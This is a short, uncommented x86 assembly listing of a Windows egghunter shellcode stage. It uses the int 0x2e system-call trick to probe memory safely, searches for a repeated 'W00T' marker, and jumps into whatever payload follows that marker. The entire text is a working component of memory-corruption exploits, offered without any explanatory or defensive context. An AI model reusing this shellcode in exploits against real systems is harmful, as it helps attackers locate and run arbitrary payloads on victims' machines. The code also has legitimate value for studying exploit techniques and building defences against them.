[BITS 32]
xor edx, edx
or dx,0xfff
inc edx
push edx
push byte +0x2
pop eax
int 0x2e
cmp al,0x5
pop edx
jz short 0x2
mov eax,0x57303054
mov edi,edx
scasd
jnz short 0x7
scasd
jnz short 0x7
jmp edi
